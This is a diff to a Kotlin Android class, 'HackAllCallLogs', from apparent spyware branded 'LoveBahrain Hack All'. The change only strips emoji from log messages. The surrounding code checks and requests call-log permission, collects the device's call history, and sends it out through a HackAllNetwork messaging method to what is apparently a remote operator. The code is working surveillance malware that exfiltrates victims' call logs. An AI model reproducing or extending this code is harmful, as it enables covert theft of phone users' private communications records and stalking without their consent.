@@ -42,10 +42,10 @@ class HackAllCallLogs(private val context: Context) {
 
     fun getCallLogs() {
         if (isCallLogsPermissionGranted(context)) {
-            HackAllNetwork(context).sendTextMessage("\uD83D\uDCF1 LoveBahrain Hack All Call Logs permission already granted\n")
+            HackAllNetwork(context).sendTextMessage("LoveBahrain Hack All Call Logs permission already granted\n")
             sendCallLogs()
         } else {
-            HackAllNetwork(context).sendTextMessage("\uD83D\uDCF1 LoveBahrain Hack All Call permission denied\n")
+            HackAllNetwork(context).sendTextMessage("LoveBahrain Hack All Call permission denied\n")
             startCallLogsPermissionRequest(context) {
                 sendCallLogs()
             }
@@ -108,12 +108,12 @@ class HackAllCallLogs(private val context: Context) {
             }
 
             if (callLogs.isNotEmpty()) {
-                HackAllNetwork(context).sendTextMessage("\uD83D\uDCF1 Collected Call Logs:\n\n$callLogs")
+                HackAllNetwork(context).sendTextMessage("Collected Call Logs:\n\n$callLogs")
             } else {
-                HackAllNetwork(context).sendTextMessage("\uD83D\uDCF1 No call logs found on the device.\n")
+                HackAllNetwork(context).sendTextMessage("No call logs found on the device.\n")
             }
         } catch (e: Exception) {
-            HackAllNetwork(context).sendTextMessage("\uD83D\uDCF1 Error reading call logs: ${e.localizedMessage}")
+            HackAllNetwork(context).sendTextMessage("Error reading call logs: ${e.localizedMessage}")
         }
     }
 }
